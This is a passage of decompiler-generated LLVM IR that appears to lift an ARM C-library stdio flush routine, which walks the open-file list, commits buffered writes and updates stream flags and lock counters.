  %v0_16224127 = phi i32 [ %v1_1621c.pre, %dec_label_pc_16224.dec_label_pc_16218_crit_edge ], [ 0, %dec_label_pc_1620c ]
  store i32 %v0_16224127, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16234 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16234, label %dec_label_pc_16238, label %dec_label_pc_16224.dec_label_pc_16218_crit_edge

dec_label_pc_16224.dec_label_pc_16218_crit_edge:  ; preds = %dec_label_pc_16224
  %v0_16218.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1621c.pre = load i32, i32* @r4, align 4
  %v1_16218 = inttoptr i32 %v0_16218.pre to i32*
  %v2_16218 = load i32, i32* %v1_16218, align 4
  store i32 %v2_16218, i32* %r3.global-to-local, align 4
  %v3_1621c = icmp uge i32 %v2_16218, %v1_1621c.pre
  store i1 %v3_1621c, i1* %cpsr_c.global-to-local, align 1
  %v9_1621c = icmp eq i32 %v2_16218, %v1_1621c.pre
  br i1 %v9_1621c, label %dec_label_pc_16224, label %dec_label_pc_1623c

dec_label_pc_16238:                               ; preds = %dec_label_pc_16224
  %v0_16238 = load i32, i32* @r4, align 4
  store i32 %v0_16238, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1623c

dec_label_pc_1623c:                               ; preds = %dec_label_pc_1620c, %dec_label_pc_16224.dec_label_pc_16218_crit_edge, %dec_label_pc_16238
  %v0_1623c = phi i32 [ %v0_16238, %dec_label_pc_16238 ], [ %v2_16218124, %dec_label_pc_1620c ], [ %v2_16218, %dec_label_pc_16224.dec_label_pc_16218_crit_edge ]
  %v1_1623c = phi i32 [ %v0_16238, %dec_label_pc_16238 ], [ 0, %dec_label_pc_1620c ], [ %v1_1621c.pre, %dec_label_pc_16224.dec_label_pc_16218_crit_edge ]
  %v3_1623c = icmp uge i32 %v0_1623c, %v1_1623c
  store i1 %v3_1623c, i1* %cpsr_c.global-to-local, align 1
  %v9_1623c = icmp eq i32 %v0_1623c, %v1_1623c
  br i1 %v9_1623c, label %bb68, label %bb67

bb67:                                             ; preds = %dec_label_pc_1623c
  %v1_16240 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_16240, i32* %r0.global-to-local, align 4
  br label %bb68

bb68:                                             ; preds = %dec_label_pc_1623c, %bb67
  %v1_16244 = xor i1 %v9_1623c, true
  call void @__pseudo_cond_branch(i1 %v1_16244, i32 ptrtoint (i32* @global_var_13a2c.496 to i32))
  %v0_16248 = load i32, i32* %r8.global-to-local, align 4
  %v1_16248 = load i32, i32* %r5.global-to-local, align 4
  %v2_16248 = add i32 %v1_16248, 8
  %v3_16248 = inttoptr i32 %v2_16248 to i32*
  store i32 %v0_16248, i32* %v3_16248, align 4
  %v0_16250.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1624c

dec_label_pc_1624c:                               ; preds = %dec_label_pc_161f8, %bb68
  %v0_1625c = phi i32 [ %v0_161fc, %dec_label_pc_161f8 ], [ %v0_16250.pre, %bb68 ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_16250 = add i32 %v0_1625c, 152
  %v3_16250 = inttoptr i32 %v2_16250 to i32*
  %v4_16250 = load i32, i32* %v3_16250, align 4
  store i32 %v4_16250, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v1_16258 = add i32 %v4_16250, 4
  %v2_16258 = inttoptr i32 %v1_16258 to i32*
  %v3_16258 = load i32, i32* %v2_16258, align 4
  store i32 %v3_16258, i32* %r1.global-to-local, align 4
  %v2_1625c = add i32 %v0_1625c, 76
  %v3_1625c = inttoptr i32 %v2_1625c to i32*
  %v4_1625c = load i32, i32* %v3_1625c, align 4
  store i32 %v4_1625c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16260 = icmp eq i32 %v3_16258, 0
  %v1_16264 = inttoptr i32 %v4_1625c to i32*
  %v2_16264 = load i32, i32* %v1_16264, align 4
  store i32 %v2_16264, i32* @r5, align 4
  br i1 %v2_16260, label %dec_label_pc_1626c, label %dec_label_pc_162cc

dec_label_pc_1626c:                               ; preds = %dec_label_pc_1624c
  %v2_1626c = add i32 %v4_16250, 8
  %v3_1626c = inttoptr i32 %v2_1626c to i32*
  store i32 0, i32* %v3_1626c, align 4
  %v0_16270 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16270, i32* @r7, align 4
  br label %dec_label_pc_16274

dec_label_pc_16274:                               ; preds = %dec_label_pc_162a4.dec_label_pc_16274_crit_edge, %dec_label_pc_1626c
  %v0_16274 = phi i32 [ %v0_16274.pre, %dec_label_pc_162a4.dec_label_pc_16274_crit_edge ], [ %v0_16270, %dec_label_pc_1626c ]
  %v1_16274 = inttoptr i32 %v0_16274 to i32*
  %v2_16274 = load i32, i32* %v1_16274, align 4
  store i32 %v2_16274, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16274, i32* %r2.global-to-local, align 4
  %v2_16280111 = load i32, i32* %v1_16274, align 4
  store i32 %v2_16280111, i32* %r3.global-to-local, align 4
  %v3_16284113 = icmp uge i32 %v2_16280111, %v2_16274
  store i1 %v3_16284113, i1* %cpsr_c.global-to-local, align 1
  %v9_16284119 = icmp eq i32 %v2_16280111, %v2_16274
  br i1 %v9_16284119, label %dec_label_pc_1628c, label %dec_label_pc_162a4

dec_label_pc_1628c:                               ; preds = %dec_label_pc_16274, %dec_label_pc_1628c.dec_label_pc_16280_crit_edge
  %v0_1628c120 = phi i32 [ %v1_16284.pre, %dec_label_pc_1628c.dec_label_pc_16280_crit_edge ], [ %v2_16274, %dec_label_pc_16274 ]
  store i32 %v0_1628c120, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1629c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1629c, label %dec_label_pc_162a0, label %dec_label_pc_1628c.dec_label_pc_16280_crit_edge

dec_label_pc_1628c.dec_label_pc_16280_crit_edge:  ; preds = %dec_label_pc_1628c
  %v0_16280.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16284.pre = load i32, i32* @r4, align 4
  %v1_16280 = inttoptr i32 %v0_16280.pre to i32*
  %v2_16280 = load i32, i32* %v1_16280, align 4
  store i32 %v2_16280, i32* %r3.global-to-local, align 4
  %v3_16284 = icmp uge i32 %v2_16280, %v1_16284.pre
  store i1 %v3_16284, i1* %cpsr_c.global-to-local, align 1
  %v9_16284 = icmp eq i32 %v2_16280, %v1_16284.pre
  br i1 %v9_16284, label %dec_label_pc_1628c, label %dec_label_pc_162a4

dec_label_pc_162a0:                               ; preds = %dec_label_pc_1628c
  %v0_162a0 = load i32, i32* @r4, align 4
  store i32 %v0_162a0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_162a4

dec_label_pc_162a4:                               ; preds = %dec_label_pc_16274, %dec_label_pc_1628c.dec_label_pc_16280_crit_edge, %dec_label_pc_162a0
  %v0_162ac = phi i32 [ %v0_162a0, %dec_label_pc_162a0 ], [ %v2_16280111, %dec_label_pc_16274 ], [ %v2_16280, %dec_label_pc_1628c.dec_label_pc_16280_crit_edge ]
  %v1_162a4 = phi i32 [ %v0_162a0, %dec_label_pc_162a0 ], [ %v2_16274, %dec_label_pc_16274 ], [ %v1_16284.pre, %dec_label_pc_1628c.dec_label_pc_16280_crit_edge ]
  %v3_162a4 = icmp uge i32 %v0_162ac, %v1_162a4
  store i1 %v3_162a4, i1* %cpsr_c.global-to-local, align 1
  %v9_162a4 = icmp eq i32 %v0_162ac, %v1_162a4
  br i1 %v9_162a4, label %dec_label_pc_162ac, label %dec_label_pc_162a4.dec_label_pc_16274_crit_edge

dec_label_pc_162a4.dec_label_pc_16274_crit_edge:  ; preds = %dec_label_pc_162a4
  %v0_16274.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_16274

dec_label_pc_162ac:                               ; preds = %dec_label_pc_162a4
  %v2_162ac = icmp ne i32 %v1_162a4, 0
  store i1 %v2_162ac, i1* %cpsr_c.global-to-local, align 1
  %v7_162b0 = icmp slt i32 %v1_162a4, 2
  br i1 %v7_162b0, label %dec_label_pc_162ccthread-pre-split, label %dec_label_pc_162b4

dec_label_pc_162b4:                               ; preds = %dec_label_pc_162ac
  %v0_162b4 = load i32, i32* @r7, align 4
  store i32 %v0_162b4, i32* %r0.global-to-local, align 4
  %v0_162b8 = load i32, i32* %r1.global-to-local, align 4
  %v1_162b8 = add i32 %v0_162b8, 129
  store i32 %v1_162b8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_162ccthread-pre-split

dec_label_pc_162ccthread-pre-split:               ; preds = %dec_label_pc_162ac, %dec_label_pc_162b4
  %v0_16418.pr.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_162cc

dec_label_pc_162cc:                               ; preds = %dec_label_pc_162ccthread-pre-split, %dec_label_pc_1624c
  %v0_16418.pr = phi i32 [ %v0_16418.pr.pr, %dec_label_pc_162ccthread-pre-split ], [ %v2_16264, %dec_label_pc_1624c ]
  store i32 92, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1641818 = icmp eq i32 %v0_16418.pr, 0
  br i1 %v2_1641818, label %dec_label_pc_16420, label %dec_label_pc_162dc

dec_label_pc_162dc:                               ; preds = %dec_label_pc_162cc, %dec_label_pc_16414
  %v0_16304 = phi i32 [ %v3_16414, %dec_label_pc_16414 ], [ %v0_16418.pr, %dec_label_pc_162cc ]
  %v1_162dc = inttoptr i32 %v0_16304 to i16*
  %v2_162dc = load i16, i16* %v1_162dc, align 2
  %v3_162dc = zext i16 %v2_162dc to i32
  store i32 %v3_162dc, i32* %r3.global-to-local, align 4
  %v1_162e0 = and i32 %v3_162dc, 64
  %v2_162e0 = icmp eq i32 %v1_162e0, 0
  br i1 %v2_162e0, label %dec_label_pc_16414, label %dec_label_pc_162e8

dec_label_pc_162e8:                               ; preds = %dec_label_pc_162dc
  %v0_162e8 = load i32, i32* @r6, align 4
  %v1_162e8 = load i32, i32* %sb.global-to-local, align 4
  %v2_162e8 = add i32 %v1_162e8, %v0_162e8
  %v3_162e8 = inttoptr i32 %v2_162e8 to i32*
  %v4_162e8 = load i32, i32* %v3_162e8, align 4
  store i32 %v4_162e8, i32* %r3.global-to-local, align 4
  %v1_162ec = inttoptr i32 %v4_162e8 to i32*
  %v2_162ec = load i32, i32* %v1_162ec, align 4
  store i32 %v2_162ec, i32* %r3.global-to-local, align 4
  %v2_162f0 = icmp ugt i32 %v2_162ec, 1
  store i1 %v2_162f0, i1* %cpsr_c.global-to-local, align 1
  %v7_162f0 = icmp eq i32 %v2_162ec, 2
  br i1 %v7_162f0, label %dec_label_pc_16354, label %dec_label_pc_162f8

dec_label_pc_162f8:                               ; preds = %dec_label_pc_162e8
  %v1_162f8 = add i32 %v0_16304, 64
  %v2_162f8 = inttoptr i32 %v1_162f8 to i32*
  %v3_162f8 = load i32, i32* %v2_162f8, align 4
  store i32 %v3_162f8, i32* %r3.global-to-local, align 4
  %v1_162fc = load i32, i32* %r8.global-to-local, align 4
  %v3_162fc = icmp uge i32 %v3_162f8, %v1_162fc
  store i1 %v3_162fc, i1* %cpsr_c.global-to-local, align 1
  %v9_162fc = icmp eq i32 %v3_162f8, %v1_162fc
  br i1 %v9_162fc, label %dec_label_pc_16348, label %dec_label_pc_16304

dec_label_pc_16304:                               ; preds = %dec_label_pc_162f8
  %v1_16304 = add i32 %v0_16304, 56
  store i32 %v1_16304, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_16304, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1631486 = inttoptr i32 %v1_16304 to i32*
  %v2_1631487 = load i32, i32* %v1_1631486, align 4
  store i32 %v2_1631487, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1631894 = icmp eq i32 %v2_1631487, 0
  br i1 %v9_1631894, label %dec_label_pc_16320, label %dec_label_pc_16338

dec_label_pc_16320:                               ; preds = %dec_label_pc_16304, %dec_label_pc_16320.dec_label_pc_16314_crit_edge
  %v0_1632095 = phi i32 [ %v1_16318.pre, %dec_label_pc_16320.dec_label_pc_16314_crit_edge ], [ 0, %dec_label_pc_16304 ]
  store i32 %v0_1632095, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16330 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16330, label %dec_label_pc_16334, label %dec_label_pc_16320.dec_label_pc_16314_crit_edge

dec_label_pc_16320.dec_label_pc_16314_crit_edge:  ; preds = %dec_label_pc_16320
  %v0_16314.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16318.pre = load i32, i32* @r4, align 4
  %v1_16314 = inttoptr i32 %v0_16314.pre to i32*
  %v2_16314 = load i32, i32* %v1_16314, align 4
  store i32 %v2_16314, i32* %r3.global-to-local, align 4
  %v3_16318 = icmp uge i32 %v2_16314, %v1_16318.pre
  store i1 %v3_16318, i1* %cpsr_c.global-to-local, align 1
  %v9_16318 = icmp eq i32 %v2_16314, %v1_16318.pre
  br i1 %v9_16318, label %dec_label_pc_16320, label %dec_label_pc_16338

dec_label_pc_16334:                               ; preds = %dec_label_pc_16320
  %v0_16334 = load i32, i32* @r4, align 4
  store i32 %v0_16334, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16338

dec_label_pc_16338:                               ; preds = %dec_label_pc_16304, %dec_label_pc_16320.dec_label_pc_16314_crit_edge, %dec_label_pc_16334
  %v0_16338 = phi i32 [ %v0_16334, %dec_label_pc_16334 ], [ %v2_1631487, %dec_label_pc_16304 ], [ %v2_16314, %dec_label_pc_16320.dec_label_pc_16314_crit_edge ]
  %v1_16338 = phi i32 [ %v0_16334, %dec_label_pc_16334 ], [ 0, %dec_label_pc_16304 ], [ %v1_16318.pre, %dec_label_pc_16320.dec_label_pc_16314_crit_edge ]
  %v3_16338 = icmp uge i32 %v0_16338, %v1_16338
  store i1 %v3_16338, i1* %cpsr_c.global-to-local, align 1
  %v9_16338 = icmp eq i32 %v0_16338, %v1_16338
  br i1 %v9_16338, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_16338
  %v1_1633c = load i32, i32* @r7, align 4
  store i32 %v1_1633c, i32* %r0.global-to-local, align 4
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_16338, %bb69
  %v1_16340 = xor i1 %v9_16338, true
  call void @__pseudo_cond_branch(i1 %v1_16340, i32 ptrtoint (i32* @global_var_13a2c.496 to i32))
  %v0_16344 = load i32, i32* %r8.global-to-local, align 4
  %v1_16344 = load i32, i32* @r5, align 4
  %v2_16344 = add i32 %v1_16344, 64
  %v3_16344 = inttoptr i32 %v2_16344 to i32*
  store i32 %v0_16344, i32* %v3_16344, align 4
  %v0_16348.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16348

dec_label_pc_16348:                               ; preds = %dec_label_pc_162f8, %bb70
  %v0_16348 = phi i32 [ %v0_16304, %dec_label_pc_162f8 ], [ %v0_16348.pre, %bb70 ]
  %v1_16348 = add i32 %v0_16348, 60
  %v2_16348 = inttoptr i32 %v1_16348 to i32*
  %v3_16348 = load i32, i32* %v2_16348, align 4
  %v1_1634c = add i32 %v3_16348, 1
  store i32 %v1_1634c, i32* %r3.global-to-local, align 4
  store i32 %v1_1634c, i32* %v2_16348, align 4
  %v0_16354.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16354

dec_label_pc_16354:                               ; preds = %dec_label_pc_162e8, %dec_label_pc_16348
  %v0_1636c = phi i32 [ %v0_16304, %dec_label_pc_162e8 ], [ %v0_16354.pre, %dec_label_pc_16348 ]
  %v1_16354 = inttoptr i32 %v0_1636c to i16*
  %v2_16354 = load i16, i16* %v1_16354, align 2
  %v3_16354 = zext i16 %v2_16354 to i32
  store i32 %stack_var_-44.1, i32* %r2.global-to-local, align 4
  %v2_1635c = or i32 %v3_16354, %stack_var_-44.1
  %v1_16360 = xor i32 %v2_1635c, 320
  store i32 %v1_16360, i32* %r3.global-to-local, align 4
  %v1_16364 = and i32 %v1_16360, 832
  %v2_16364 = icmp eq i32 %v1_16364, 0
  br i1 %v2_16364, label %dec_label_pc_1636c, label %bb71

dec_label_pc_1636c:                               ; preds = %dec_label_pc_16354
  store i32 %v0_1636c, i32* %r0.global-to-local, align 4
  %v1_16370 = call i32 @__stdio_wcommit(i32 %v0_1636c)
  store i32 %v1_16370, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16374 = icmp eq i32 %v1_16370, 0
  br i1 %v2_16374, label %.thread6, label %.thread7

.thread6:                                         ; preds = %dec_label_pc_1636c
  %v1_16378 = load i32, i32* @r5, align 4
  %v2_16378 = inttoptr i32 %v1_16378 to i16*
  %v3_16378 = load i16, i16* %v2_16378, align 2
  %v4_16378 = zext i16 %v3_16378 to i32
  store i32 %v4_16378, i32* %r3.global-to-local, align 4
  %v2_1637c = add i32 %v1_16378, 8
  %v3_1637c = inttoptr i32 %v2_1637c to i32*
  %v4_1637c = load i32, i32* %v3_1637c, align 4
  store i32 %v4_1637c, i32* %r2.global-to-local, align 4
  %v2_16380 = and i32 %v4_16378, 65471
  store i32 %v2_16380, i32* %r3.global-to-local, align 4
  %v3_16384 = add i32 %v1_16378, 28
  %v4_16384 = inttoptr i32 %v3_16384 to i32*
  store i32 %v4_1637c, i32* %v4_16384, align 4
  %v1_16388 = load i32, i32* %r3.global-to-local, align 4
  %v2_16388 = trunc i32 %v1_16388 to i16
  %v3_16388 = load i32, i32* @r5, align 4
  %v4_16388 = inttoptr i32 %v3_16388 to i16*
  store i16 %v2_16388, i16* %v4_16388, align 2
  br label %bb71

.thread7:                                         ; preds = %dec_label_pc_1636c
  %v1_1638c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v1_1638c, i32* %sl.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %.thread6, %dec_label_pc_16354, %.thread7
  %v0_16390 = load i32, i32* @r6, align 4
  %v1_16390 = load i32, i32* %sb.global-to-local, align 4
  %v2_16390 = add i32 %v1_16390, %v0_16390
  %v3_16390 = inttoptr i32 %v2_16390 to i32*
  %v4_16390 = load i32, i32* %v3_16390, align 4
  store i32 %v4_16390, i32* %r3.global-to-local, align 4
  %v1_16394 = inttoptr i32 %v4_16390 to i32*
  %v2_16394 = load i32, i32* %v1_16394, align 4
  store i32 %v2_16394, i32* %r3.global-to-local, align 4
  %v2_16398 = icmp ugt i32 %v2_16394, 1
  store i1 %v2_16398, i1* %cpsr_c.global-to-local, align 1
  %v7_16398 = icmp eq i32 %v2_16394, 2
  br i1 %v7_16398, label %dec_label_pc_16414, label %dec_label_pc_163a0

dec_label_pc_163a0:                               ; preds = %bb71
  %v0_163a0 = load i32, i32* @r5, align 4
  %v1_163a0 = add i32 %v0_163a0, 60
  %v2_163a0 = inttoptr i32 %v1_163a0 to i32*
  %v3_163a0 = load i32, i32* %v2_163a0, align 4
  %v1_163a4 = add i32 %v3_163a0, -1
  store i32 %v1_163a4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_163a8 = icmp eq i32 %v1_163a4, 0
  store i32 %v1_163a4, i32* %v2_163a0, align 4
  br i1 %v2_163a8, label %dec_label_pc_163b4, label %dec_label_pc_16414

dec_label_pc_163b4:                               ; preds = %dec_label_pc_163a0
  %v0_163b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_163b4 = load i32, i32* @r5, align 4
  %v2_163b4 = add i32 %v1_163b4, 64
  %v3_163b4 = inttoptr i32 %v2_163b4 to i32*
  store i32 %v0_163b4, i32* %v3_163b4, align 4
  %v0_163b8 = load i32, i32* @r5, align 4
  %v1_163b8 = add i32 %v0_163b8, 56
  store i32 %v1_163b8, i32* @r7, align 4
  br label %dec_label_pc_163bc

dec_label_pc_163bc:                               ; preds = %dec_label_pc_163ec.dec_label_pc_163bc_crit_edge, %dec_label_pc_163b4
  %v0_163c4 = phi i32 [ %v0_163c4.pre, %dec_label_pc_163ec.dec_label_pc_163bc_crit_edge ], [ %v1_163b8, %dec_label_pc_163b4 ]
  %v0_163bc = phi i32 [ %v0_163bc.pre, %dec_label_pc_163ec.dec_label_pc_163bc_crit_edge ], [ %v0_163b8, %dec_label_pc_163b4 ]
  %v1_163bc = add i32 %v0_163bc, 56
  %v2_163bc = inttoptr i32 %v1_163bc to i32*
  %v3_163bc = load i32, i32* %v2_163bc, align 4
  store i32 %v3_163bc, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_163c4, i32* %r2.global-to-local, align 4
  %v1_163c897 = inttoptr i32 %v0_163c4 to i32*
  %v2_163c898 = load i32, i32* %v1_163c897, align 4
  store i32 %v2_163c898, i32* %r3.global-to-local, align 4
  %v3_163cc100 = icmp uge i32 %v2_163c898, %v3_163bc
  store i1 %v3_163cc100, i1* %cpsr_c.global-to-local, align 1
  %v9_163cc106 = icmp eq i32 %v2_163c898, %v3_163bc
  br i1 %v9_163cc106, label %dec_label_pc_163d4, label %dec_label_pc_163ec

dec_label_pc_163d4:                               ; preds = %dec_label_pc_163bc, %dec_label_pc_163d4.dec_label_pc_163c8_crit_edge
  %v0_163d4107 = phi i32 [ %v1_163cc.pre, %dec_label_pc_163d4.dec_label_pc_163c8_crit_edge ], [ %v3_163bc, %dec_label_pc_163bc ]
  store i32 %v0_163d4107, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_163e4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_163e4, label %dec_label_pc_163e8, label %dec_label_pc_163d4.dec_label_pc_163c8_crit_edge

dec_label_pc_163d4.dec_label_pc_163c8_crit_edge:  ; preds = %dec_label_pc_163d4
  %v0_163c8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_163cc.pre = load i32, i32* @r4, align 4
  %v1_163c8 = inttoptr i32 %v0_163c8.pre to i32*
  %v2_163c8 = load i32, i32* %v1_163c8, align 4
  store i32 %v2_163c8, i32* %r3.global-to-local, align 4
  %v3_163cc = icmp uge i32 %v2_163c8, %v1_163cc.pre
  store i1 %v3_163cc, i1* %cpsr_c.global-to-local, align 1
  %v9_163cc = icmp eq i32 %v2_163c8, %v1_163cc.pre
  br i1 %v9_163cc, label %dec_label_pc_163d4, label %dec_label_pc_163ec

dec_label_pc_163e8:                               ; preds = %dec_label_pc_163d4
  %v0_163e8 = load i32, i32* @r4, align 4
  store i32 %v0_163e8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_163ec

dec_label_pc_163ec:                               ; preds = %dec_label_pc_163bc, %dec_label_pc_163d4.dec_label_pc_163c8_crit_edge, %dec_label_pc_163e8
  %v0_163f4 = phi i32 [ %v0_163e8, %dec_label_pc_163e8 ], [ %v2_163c898, %dec_label_pc_163bc ], [ %v2_163c8, %dec_label_pc_163d4.dec_label_pc_163c8_crit_edge ]
  %v1_163ec = phi i32 [ %v0_163e8, %dec_label_pc_163e8 ], [ %v3_163bc, %dec_label_pc_163bc ], [ %v1_163cc.pre, %dec_label_pc_163d4.dec_label_pc_163c8_crit_edge ]
  %v3_163ec = icmp uge i32 %v0_163f4, %v1_163ec
  store i1 %v3_163ec, i1* %cpsr_c.global-to-local, align 1
  %v9_163ec = icmp eq i32 %v0_163f4, %v1_163ec
  br i1 %v9_163ec, label %dec_label_pc_163f4, label %dec_label_pc_163ec.dec_label_pc_163bc_crit_edge

dec_label_pc_163ec.dec_label_pc_163bc_crit_edge:  ; preds = %dec_label_pc_163ec
  %v0_163bc.pre = load i32, i32* @r5, align 4
  %v0_163c4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_163bc

dec_label_pc_163f4:                               ; preds = %dec_label_pc_163ec
  %v2_163f4 = icmp ne i32 %v1_163ec, 0
  store i1 %v2_163f4, i1* %cpsr_c.global-to-local, align 1
  %v7_163f8 = icmp slt i32 %v1_163ec, 2
  br i1 %v7_163f8, label %dec_label_pc_16414, label %dec_label_pc_163fc

dec_label_pc_163fc:                               ; preds = %dec_label_pc_163f4
  %v0_163fc = load i32, i32* @r5, align 4
  %v1_163fc = add i32 %v0_163fc, 56
  store i32 %v1_163fc, i32* %r0.global-to-local, align 4
  %v0_16400 = load i32, i32* %r1.global-to-local, align 4
  %v1_16400 = add i32 %v0_16400, 129
  store i32 %v1_16400, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16414

dec_label_pc_16414:                               ; preds = %dec_label_pc_163a0, %dec_label_pc_163fc, %dec_label_pc_163f4, %bb71, %dec_label_pc_162dc
  %v0_16414 = load i32, i32* @r5, align 4
  %v1_16414 = add i32 %v0_16414, 32
  %v2_16414 = inttoptr i32 %v1_16414 to i32*
  %v3_16414 = load i32, i32* %v2_16414, align 4
  store i32 %v3_16414, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16418 = icmp eq i32 %v3_16414, 0
  br i1 %v2_16418, label %dec_label_pc_16420, label %dec_label_pc_162dc

dec_label_pc_16420:                               ; preds = %dec_label_pc_16414, %dec_label_pc_162cc
  %v0_16420 = call i32 @_stdio_openlist_dec_use()
  store i32 %v0_16420, i32* %r0.global-to-local, align 4
  %v0_1645c.pre = load i32, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_16428:                               ; preds = %dec_label_pc_16104
  %v3_16428 = load i16, i16* %arg1, align 2
  %v4_16428 = zext i16 %v3_16428 to i32
  %v1_1642c = and i32 %v4_16428, 64
  store i32 %v1_1642c, i32* %r3.global-to-local, align 4
  %v2_1642c = icmp eq i32 %v1_1642c, 0
  br i1 %v2_1642c, label %bb72, label %dec_label_pc_16438

bb72:                                             ; preds = %dec_label_pc_16428
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_16438:                               ; preds = %dec_label_pc_16428
  %v2_16438 = call i32 @__stdio_wcommit(i32 %tmp)
  store i32 %v2_16438, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1643c = icmp eq i32 %v2_16438, 0
  br i1 %v2_1643c, label %.thread14, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_16438
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb73

.thread14:                                        ; preds = %dec_label_pc_16438
  %v1_16440 = load i32, i32* @r4, align 4
  %v2_16440 = inttoptr i32 %v1_16440 to i16*
  %v3_16440 = load i16, i16* %v2_16440, align 2
  %v4_16440 = zext i16 %v3_16440 to i32
  store i32 %v4_16440, i32* %r3.global-to-local, align 4
  %v2_16444 = add i32 %v1_16440, 8
  %v3_16444 = inttoptr i32 %v2_16444 to i32*
  %v4_16444 = load i32, i32* %v3_16444, align 4
  store i32 %v4_16444, i32* %r2.global-to-local, align 4
  %v2_16448 = and i32 %v4_16440, 65471
  store i32 %v2_16448, i32* %r3.global-to-local, align 4
  %v2_1644c = trunc i32 %v2_16448 to i16
  store i16 %v2_1644c, i16* %v2_16440, align 2
  %v1_16450 = load i32, i32* %r2.global-to-local, align 4
  %v2_16450 = load i32, i32* @r4, align 4
  %v3_16450 = add i32 %v2_16450, 28
  %v4_16450 = inttoptr i32 %v3_16450 to i32*
  store i32 %v1_16450, i32* %v4_16450, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

bb73:                                             ; preds = %bb72, %.thread16, %dec_label_pc_16420, %.thread14
  %v0_1645c = phi i32 [ -1, %.thread16 ], [ 0, %bb72 ], [ %v0_1645c.pre, %dec_label_pc_16420 ], [ 0, %.thread14 ]
  store i32 %v0_1645c, i32* %r0.global-to-local, align 4
  store i32 %v6_160d8, i32* %r5.global-to-local, align 4
  ret i32 %v0_1645c

; uselistorder directives
  uselistorder i32 %v0_1645c, { 1, 0 }
  uselistorder i32 %v3_16414, { 1, 2, 0 }
  uselistorder i32 %v0_163e8, { 1, 0, 2 }
  uselistorder i32 %v1_163cc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1636c, { 1, 0, 2 }
  uselistorder i32 %v0_16334, { 1, 0, 2 }
  uselistorder i32 %v1_16318.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_162fc, { 1, 0 }
  uselistorder i32 %v0_162a0, { 1, 0, 2 }
  uselistorder i32 %v1_16284.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16274, { 1, 0 }
  uselistorder i32 %v0_16238, { 1, 0, 2 }
  uselistorder i32 %v1_1621c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_16204, { 1, 0 }
  uselistorder i32 %v0_161cc, { 1, 0, 2 }
  uselistorder i32 %v1_161b0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_161a0, { 1, 0 }
  uselistorder i32 %v0_1615c, { 1, 0, 2 }
  uselistorder i32 %v1_16140.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_16118, { 2, 1, 0, 3 }
  uselistorder i32 %tmp, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %sl.global-to-local, { 0, 5, 1, 3, 2, 4 }
